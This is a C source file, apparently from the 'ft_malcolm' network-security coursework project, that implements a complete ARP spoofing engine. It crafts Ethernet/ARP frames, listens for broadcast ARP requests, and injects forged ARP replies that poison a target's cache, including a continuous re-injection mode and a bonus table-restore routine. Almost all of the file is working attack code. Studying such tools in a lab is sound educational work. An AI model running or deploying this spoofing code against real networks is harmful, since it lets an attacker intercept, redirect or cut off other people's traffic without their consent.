/**
 * @file arp.c
 * @brief ARP frame crafting, sniffing, and poisoning engine
 */

#include "ft_malcolm.h"

/**
 * @brief Construct a standard Layer-2 Ethernet + ARP frame
 */
void build_arp_frame(t_arp_frame *frame,
                     uint16_t opcode,
                     const uint8_t src_eth_mac[ETH_ALEN],
                     const uint8_t dst_eth_mac[ETH_ALEN],
                     const uint8_t sender_mac[ETH_ALEN],
                     const uint8_t sender_ip[IP4_ALEN],
                     const uint8_t target_mac[ETH_ALEN],
                     const uint8_t target_ip[IP4_ALEN]) {
    memset(frame, 0, sizeof(t_arp_frame));

    /* Ethernet Header */
    memcpy(frame->eth.dst_mac, dst_eth_mac, ETH_ALEN);
    memcpy(frame->eth.src_mac, src_eth_mac, ETH_ALEN);
    frame->eth.eth_type = htons(ETHERTYPE_ARP);

    /* ARP Header */
    frame->arp.hw_type = htons(ARPHRD_ETHER);
    frame->arp.proto_type = htons(ETHERTYPE_IP);
    frame->arp.hw_len = ETH_ALEN;
    frame->arp.proto_len = IP4_ALEN;
    frame->arp.opcode = htons(opcode);

    memcpy(frame->arp.sender_mac, sender_mac, ETH_ALEN);
    memcpy(frame->arp.sender_ip, sender_ip, IP4_ALEN);
    memcpy(frame->arp.target_mac, target_mac, ETH_ALEN);
    memcpy(frame->arp.target_ip, target_ip, IP4_ALEN);
}

/**
 * @brief Determine if a received frame is a valid broadcast ARP request
 */
bool is_matching_arp_request(const t_arp_frame *frame, const t_malcolm_config *cfg) {
    if (ntohs(frame->eth.eth_type) != ETHERTYPE_ARP)
        return false;

    if (ntohs(frame->arp.hw_type) != ARPHRD_ETHER ||
        ntohs(frame->arp.proto_type) != ETHERTYPE_IP ||
        frame->arp.hw_len != ETH_ALEN ||
        frame->arp.proto_len != IP4_ALEN) {
        return false;
    }

    if (ntohs(frame->arp.opcode) != ARPOP_REQUEST)
        return false;

    /* Check if frame was sent to broadcast address */
    static const uint8_t broadcast_mac[ETH_ALEN] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
    bool is_bcast = (memcmp(frame->eth.dst_mac, broadcast_mac, ETH_ALEN) == 0);

    if (cfg->verbose) {
        char src_mac_s[20], src_ip_s[20], tgt_ip_s[20];
        format_mac(frame->arp.sender_mac, src_mac_s, sizeof(src_mac_s));
        format_ip(frame->arp.sender_ip, src_ip_s, sizeof(src_ip_s));
        format_ip(frame->arp.target_ip, tgt_ip_s, sizeof(tgt_ip_s));
        printf(COLOR_GRAY "[DEBUG] ARP Request: Who has %s? Tell %s (%s) [bcast=%d]\n" COLOR_RESET,
               tgt_ip_s, src_ip_s, src_mac_s, is_bcast);
    }

    /* Per subject specification: any broadcast ARP request triggers the reply */
    return is_bcast;
}

/**
 * @brief Send spoofed ARP Reply packet to target
 */
int send_spoofed_arp_reply(const t_malcolm_config *cfg) {
    t_arp_frame reply_frame;

    /* Build spoofed reply:
     * - Ethernet Dst: target MAC
     * - Ethernet Src: spoofed source MAC (or local MAC)
     * - ARP Sender MAC: spoofed source MAC
     * - ARP Sender IP: source IP (e.g. gateway)
     * - ARP Target MAC: target MAC
     * - ARP Target IP: target IP
     */
    build_arp_frame(&reply_frame,
                    ARPOP_REPLY,
                    cfg->src_mac,
                    cfg->tgt_mac,
                    cfg->src_mac,
                    cfg->src_ip,
                    cfg->tgt_mac,
                    cfg->tgt_ip);

    if (cfg->verbose) {
        print_packet_details(&reply_frame, "Outgoing Spoofed ARP Reply");
    }

    int res = send_raw_frame(cfg, &reply_frame, sizeof(reply_frame));
    if (res < 0) {
        fprintf(stderr, "ft_malcolm: failed to inject ARP reply frame.\n");
        return -1;
    }
    return 0;
}

/**
 * @brief Send authentic ARP packets to restore target's ARP cache (Bonus)
 */
int restore_arp_table(const t_malcolm_config *cfg) {
    t_arp_frame restore_frame;

    printf("\n" COLOR_YELLOW "[*] Restoring ARP tables on target..." COLOR_RESET "\n");

    /* Broadcast correct mapping */
    static const uint8_t bcast_mac[ETH_ALEN] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

    build_arp_frame(&restore_frame,
                    ARPOP_REPLY,
                    cfg->local_mac,
                    bcast_mac,
                    cfg->local_mac,
                    cfg->local_ip,
                    cfg->tgt_mac,
                    cfg->tgt_ip);

    int result = 0;
    for (int i = 0; i < 3; i++) {
        if (send_raw_frame(cfg, &restore_frame, sizeof(restore_frame)) < 0)
            result = -1;
        safe_msleep(100);
    }
    if (result == 0)
        printf(COLOR_GREEN "[+] ARP announcement sent." COLOR_RESET "\n");
    else
        fprintf(stderr, "ft_malcolm: one or more restoration announcements failed.\n");
    return result;
}

/**
 * @brief Main sniffing and injection loop
 */
int run_malcolm_loop(t_malcolm_config *cfg) {
    printf("Found available interface: %s\n", cfg->iface_name);

    if (cfg->continuous) {
        printf(COLOR_CYAN "[*] Continuous mode activated (Interval: %d ms). Press Ctrl+C to stop." COLOR_RESET "\n",
               cfg->interval_ms);

        int result = 0;
        while (g_running) {
            if (send_spoofed_arp_reply(cfg) < 0) {
                result = -1;
                break;
            }
            if (cfg->verbose)
                printf(COLOR_GREEN "[+] Injected spoofed ARP reply to %s" COLOR_RESET "\n", cfg->tgt_ip_str);
            safe_msleep(cfg->interval_ms);
        }

        if (cfg->restore_on_exit) {
            if (restore_arp_table(cfg) < 0)
                result = -1;
        }
        return result;
    }

    /* Mandatory mode: wait for broadcast ARP request */
    if (cfg->verbose) {
        printf(COLOR_BLUE "[*] Listening for broadcast ARP requests on %s..." COLOR_RESET "\n", cfg->iface_name);
    }

    uint8_t buffer[2048];
    while (g_running) {
        ssize_t len = recv_raw_frame(cfg, buffer, sizeof(buffer));
        if (len < 0) {
            if (!g_running)
                break;
            return -1;
        }
        if (len == 0) {
            continue;
        }

        if (len < (ssize_t)sizeof(t_eth_hdr) + (ssize_t)sizeof(t_arp_hdr))
            continue;

        t_arp_frame *frame = (t_arp_frame *)buffer;
        if (is_matching_arp_request(frame, cfg)) {
            print_subject_arp_detected(frame);

            printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
            safe_msleep(500);

            if (send_spoofed_arp_reply(cfg) == 0) {
                print_subject_reply_sent();
            } else {
                return -1;
            }

            printf("Exiting program...\n");
            return 0;
        }
    }

    return 0;
}
